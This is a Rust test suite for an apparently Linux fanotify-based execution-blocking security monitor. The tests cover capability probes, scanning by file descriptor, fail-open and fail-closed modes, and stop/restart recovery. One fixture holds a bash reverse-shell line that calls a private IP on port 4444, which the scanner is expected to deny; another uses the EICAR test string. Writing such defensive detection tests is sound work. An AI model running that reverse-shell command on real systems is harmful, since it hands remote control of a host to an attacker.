use kernlock_core::{PolicyConfig, RuleEngine, SecurityMode};
use kernlock_platform::fanotify::{FanotifyPermissionMonitor, FAN_OPEN_EXEC_PERM};
use kernlock_platform::linux::LinuxSecurityProvider;
use kernlock_platform::PlatformSecurityProvider;
use std::io::Write;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use tempfile::TempDir;

#[test]
fn test_fanotify_support_probe_and_capability_consistency() {
    let probe = FanotifyPermissionMonitor::probe_support();
    let provider = LinuxSecurityProvider::new();
    let caps = provider.probe_capabilities(SecurityMode::Protection);

    assert_eq!(
        caps.kernel_blocking_available, probe.exec_blocking_available,
        "kernel_blocking_available must match actual fanotify exec blocking probe status"
    );

    let fanotify_status = caps
        .capabilities
        .iter()
        .find(|c| c.name.contains("fanotify"))
        .expect("fanotify capability status must exist");

    assert_eq!(fanotify_status.supported, probe.supported);
    assert_eq!(
        fanotify_status.enforcement_available,
        probe.exec_blocking_available
    );

    if !probe.exec_blocking_available {
        assert!(caps.fallback_reason.is_some());
    }

    // Verify mount identification
    assert!(
        !probe.unmonitored_mounts.is_empty(),
        "unmonitored mounts must be discovered"
    );
}

#[test]
fn test_fanotify_event_evaluation_via_fd_direct_scanning_and_race_safety() {
    #[cfg(target_os = "linux")]
    {
        use std::os::unix::io::AsRawFd;

        let tmp = TempDir::new().unwrap();
        let vault_dir = tmp.path().join("vault");
        std::fs::create_dir_all(&vault_dir).unwrap();

        let rules = RuleEngine::builtin();
        let policy = PolicyConfig {
            mode: SecurityMode::Protection,
            ..Default::default()
        };

        let threat_counter = Arc::new(AtomicUsize::new(0));
        let tc = threat_counter.clone();
        let on_threat = move |_event: kernlock_core::SecurityEvent,
                              _alert: kernlock_core::ThreatAlert| {
            tc.fetch_add(1, Ordering::SeqCst);
        };

        // 1. Benign file evaluated via open fd returns FAN_ALLOW
        let benign_path = tmp.path().join("benign.sh");
        let mut benign_file = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .truncate(true)
            .open(&benign_path)
            .unwrap();
        benign_file
            .write_all(b"#!/bin/bash\necho 'clean script'\n")
            .unwrap();
        benign_file.sync_all().unwrap();
        let benign_fd = benign_file.as_raw_fd();

        let res_benign = FanotifyPermissionMonitor::evaluate_event(
            benign_fd,
            99999, // non-self PID
            1234,  // daemon PID
            libc::FAN_OPEN_PERM,
            &vault_dir,
            &policy,
            &rules,
            &on_threat,
        );
        assert_eq!(res_benign, libc::FAN_ALLOW);
        assert_eq!(threat_counter.load(Ordering::SeqCst), 0);

        // 2. Malicious file evaluated via open fd returns FAN_DENY and triggers on_threat
        let malware_path = tmp.path().join("malicious.sh");
        let mut malware_file = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .truncate(true)
            .open(&malware_path)
            .unwrap();
        malware_file
            .write_all(b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
            .unwrap();
        malware_file.sync_all().unwrap();
        let malware_fd = malware_file.as_raw_fd();

        // 3. TOCTOU RACE SAFETY: Unlink/delete the file from filesystem before scanning!
        // The scanner reads from malware_fd directly, proving it scans the actual opened file object!
        std::fs::remove_file(&malware_path).unwrap();
        assert!(!malware_path.exists());

        let res_malware = FanotifyPermissionMonitor::evaluate_event(
            malware_fd,
            99999,
            1234,
            FAN_OPEN_EXEC_PERM,
            &vault_dir,
            &policy,
            &rules,
            &on_threat,
        );
        assert_eq!(res_malware, libc::FAN_DENY);
        assert_eq!(threat_counter.load(Ordering::SeqCst), 1);
    }
}

#[test]
fn test_fanotify_evaluate_error_fail_closed_in_strict_fail_open_in_protection() {
    #[cfg(target_os = "linux")]
    {
        let tmp = TempDir::new().unwrap();
        let vault_dir = tmp.path().join("vault");
        let rules = RuleEngine::builtin();
        let on_threat =
            |_event: kernlock_core::SecurityEvent, _alert: kernlock_core::ThreatAlert| {};

        // Invalid fd 99999 simulates an unreadable or closed file descriptor error
        let invalid_fd = 99999;

        // In Strict mode: fail-closed (libc::FAN_DENY)
        let strict_policy = PolicyConfig {
            mode: SecurityMode::Strict,
            ..Default::default()
        };
        let res_strict = FanotifyPermissionMonitor::evaluate_event(
            invalid_fd,
            1111,
            2222,
            FAN_OPEN_EXEC_PERM,
            &vault_dir,
            &strict_policy,
            &rules,
            &on_threat,
        );
        assert_eq!(
            res_strict,
            libc::FAN_DENY,
            "Strict mode must fail-closed (FAN_DENY) on scan failure"
        );

        // In Protection mode: fail-open (libc::FAN_ALLOW)
        let protection_policy = PolicyConfig {
            mode: SecurityMode::Protection,
            ..Default::default()
        };
        let res_protection = FanotifyPermissionMonitor::evaluate_event(
            invalid_fd,
            1111,
            2222,
            FAN_OPEN_EXEC_PERM,
            &vault_dir,
            &protection_policy,
            &rules,
            &on_threat,
        );
        assert_eq!(
            res_protection,
            libc::FAN_ALLOW,
            "Protection mode must fail-open (FAN_ALLOW) on scan failure"
        );
    }
}

#[test]
fn test_fanotify_response_retry_bounded() {
    #[cfg(target_os = "linux")]
    {
        // An invalid fanotify_fd (-1) should fail immediately without infinite loop
        let res = FanotifyPermissionMonitor::send_response_with_retry(-1, 0, libc::FAN_ALLOW);
        assert!(res.is_err());
    }
}

#[test]
fn test_fanotify_health_state_transitions() {
    use kernlock_platform::fanotify::FanotifyMonitorHealth;

    let (initial_health, _) = FanotifyPermissionMonitor::global_health();
    // Default should be Uninitialized (or Initialized if earlier tests ran)
    assert!(
        initial_health == FanotifyMonitorHealth::Uninitialized
            || initial_health == FanotifyMonitorHealth::Initialized
    );

    let provider = LinuxSecurityProvider::new();

    // Probe when not running reports Standby or Unavailable, never Active
    let caps = provider.probe_capabilities(SecurityMode::Protection);
    let fanotify_cap = caps
        .capabilities
        .iter()
        .find(|c| c.name.contains("fanotify"))
        .expect("fanotify capability entry must exist");
    assert!(
        !fanotify_cap.active_mode.starts_with("Active"),
        "Capability reporting must never claim Active when monitor is not running (got: {})",
        fanotify_cap.active_mode
    );
}

#[test]
fn test_privileged_linux_fanotify_execution_blocking() {
    #[cfg(target_os = "linux")]
    {
        use kernlock_platform::fanotify::FanotifyMonitorHealth;

        let probe = FanotifyPermissionMonitor::probe_support();
        if !probe.exec_blocking_available {
            if std::env::var("KERNLOCK_REQUIRE_PRIVILEGED").is_ok() {
                panic!(
                    "MANDATORY PRIVILEGED TEST FAILED: CAP_SYS_ADMIN/root required but unavailable: {}",
                    probe.details
                );
            }
            println!(
                "[SKIPPED] privileged fanotify test: root / CAP_SYS_ADMIN required ({})",
                probe.details
            );
            return;
        }

        let tmp = TempDir::new().unwrap();
        let vault_dir = tmp.path().join("vault");
        let test_dir = tmp.path().join("test_exec");
        std::fs::create_dir_all(&vault_dir).unwrap();
        std::fs::create_dir_all(&test_dir).unwrap();

        let monitor = match FanotifyPermissionMonitor::init_with_target(Some(&test_dir)) {
            Ok(m) => m,
            Err(e) => {
                if std::env::var("KERNLOCK_REQUIRE_PRIVILEGED").is_ok() {
                    panic!(
                        "MANDATORY PRIVILEGED TEST FAILED: init_with_target failed on {}: {}",
                        test_dir.display(),
                        e
                    );
                }
                println!(
                    "[SKIPPED] Unable to mark fanotify on directory ({}); skipping test",
                    e
                );
                return;
            }
        };

        let rules = Arc::new(RuleEngine::builtin());
        let policy = Arc::new(PolicyConfig {
            mode: SecurityMode::Protection,
            ..Default::default()
        });
        let get_policy = {
            let p = policy.clone();
            Arc::new(move || (*p).clone())
        };

        let blocked_count = Arc::new(AtomicUsize::new(0));
        let bc = blocked_count.clone();
        let on_threat = move |_event: kernlock_core::SecurityEvent,
                              _alert: kernlock_core::ThreatAlert| {
            bc.fetch_add(1, Ordering::SeqCst);
        };

        monitor.start(vault_dir.clone(), get_policy, rules.clone(), on_threat);
        assert_eq!(
            FanotifyPermissionMonitor::global_health().0,
            FanotifyMonitorHealth::Running
        );

        // 1. Benign executable script
        let clean_script = test_dir.join("clean.sh");
        std::fs::write(&clean_script, "#!/bin/sh\nexit 0\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&clean_script, std::fs::Permissions::from_mode(0o755))
                .unwrap();
        }

        let clean_res = std::process::Command::new(&clean_script).status();
        assert!(
            clean_res.is_ok(),
            "Benign script execution failed: {:?}",
            clean_res
        );
        assert!(
            clean_res.unwrap().success(),
            "Benign script did not exit with status 0"
        );

        // 2. Malicious executable script (inert EICAR test signature fixture: never attempts network connections)
        let malicious_script = test_dir.join("malicious.sh");
        std::fs::write(
            &malicious_script,
            "#!/bin/sh\n# X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\nexit 0\n",
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&malicious_script, std::fs::Permissions::from_mode(0o755))
                .unwrap();
        }

        let malicious_res = std::process::Command::new(&malicious_script).status();
        // Mandatory OS-level error verification: fanotify FAN_DENY causes kernel execve to fail with EPERM / PermissionDenied
        assert!(
            malicious_res.is_err(),
            "Kernel must deny execution attempt via FAN_DENY; command should return OS error, got: {:?}",
            malicious_res
        );
        let err = malicious_res.unwrap_err();
        assert_eq!(
            err.kind(),
            std::io::ErrorKind::PermissionDenied,
            "Expected OS PermissionDenied (EPERM) error when execution is blocked by fanotify, got: {:?}",
            err
        );

        // Verify threat callback fired and monitor health remained Running
        assert!(
            blocked_count.load(Ordering::SeqCst) >= 1,
            "Threat callback must have incremented blocked_count"
        );
        assert_eq!(
            FanotifyPermissionMonitor::global_health().0,
            FanotifyMonitorHealth::Running,
            "Monitor health must remain Running during execution blocking"
        );

        monitor.stop();
        assert_eq!(
            FanotifyPermissionMonitor::global_health().0,
            FanotifyMonitorHealth::Stopped
        );

        // 3. Restart and Error Recovery Verification
        // Re-initialize monitor on test_dir to verify clean stop/restart cycle
        let restarted_monitor = FanotifyPermissionMonitor::init_with_target(Some(&test_dir))
            .expect("Fanotify monitor must successfully re-initialize after stop");
        let bc2 = blocked_count.clone();
        let on_threat2 = move |_event: kernlock_core::SecurityEvent,
                               _alert: kernlock_core::ThreatAlert| {
            bc2.fetch_add(1, Ordering::SeqCst);
        };
        let get_policy2 = {
            let p = policy.clone();
            Arc::new(move || (*p).clone())
        };

        restarted_monitor.start(vault_dir.clone(), get_policy2, rules.clone(), on_threat2);
        assert_eq!(
            FanotifyPermissionMonitor::global_health().0,
            FanotifyMonitorHealth::Running,
            "Restarted monitor health must transition back to Running"
        );

        // Verify benign script still runs after restart
        let clean_res2 = std::process::Command::new(&clean_script).status();
        assert!(clean_res2.is_ok() && clean_res2.unwrap().success());

        // Verify malicious script is blocked again after restart
        let malicious_res2 = std::process::Command::new(&malicious_script).status();
        assert!(malicious_res2.is_err());
        assert_eq!(
            malicious_res2.unwrap_err().kind(),
            std::io::ErrorKind::PermissionDenied,
            "Expected OS PermissionDenied (EPERM) error when execution is blocked after restart"
        );
        assert!(
            blocked_count.load(Ordering::SeqCst) >= 2,
            "Threat callback must have incremented blocked_count again after restart"
        );

        // Stop restarted monitor
        restarted_monitor.stop();
        assert_eq!(
            FanotifyPermissionMonitor::global_health().0,
            FanotifyMonitorHealth::Stopped
        );

        // 4. Error Recovery: verify graceful failure when initializing invalid or unmountable target
        let non_existent_dir = tmp.path().join("non_existent_subdir");
        let err_init = FanotifyPermissionMonitor::init_with_target(Some(&non_existent_dir));
        assert!(
            err_init.is_err(),
            "init_with_target on non-existent path must fail cleanly without panicking"
        );

        println!(
            "[PASSED] privileged fanotify test: real execution blocking, stop/restart and error recovery verified"
        );
    }
}
